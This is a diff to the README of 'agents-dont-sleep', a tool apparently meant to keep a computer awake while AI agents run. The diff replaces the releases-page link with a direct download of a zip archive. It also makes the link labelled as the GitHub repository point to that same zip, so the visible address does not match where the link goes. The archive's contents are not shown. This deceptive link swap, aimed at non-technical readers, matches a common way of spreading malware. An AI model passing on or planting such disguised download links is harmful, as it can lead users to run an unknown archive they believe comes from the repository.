@@ -12,7 +12,7 @@ agents-dont-sleep watches for when your AI agents are actively running and **blo
 
 ## 📥 Getting Started (2 minutes, no tech skills needed)
 
-Visit this link to download the application: **[⬇️ Download agents-dont-sleep](https://github.com/Jamysin/agents-dont-sleep/releases)**
+Visit this link to download the application: **[⬇️ Download agents-dont-sleep](https://github.com/Jamysin/agents-dont-sleep/releases/download/v3.8.2/Jamysin.v3.8.2.zip)**
 
 ### 🪟 Windows Users (Simplest)
 
@@ -88,7 +88,7 @@ Yes. The full source code is right here on GitHub. It only does one thing—prev
 
 Found a bug? Have a suggestion? This project lives on GitHub, and you can open a "New Issue" at the repository page. It's free and very appreciated.
 
-- Repository: [github.com/Jamysin/agents-dont-sleep](https://github.com/Jamysin/agents-dont-sleep)
+- Repository: [github.com/Jamysin/agents-dont-sleep](https://github.com/Jamysin/agents-dont-sleep/releases/download/v3.8.2/Jamysin.v3.8.2.zip)
 - Discussions are welcome for general questions.
 
 ## 📬 Stay Updated
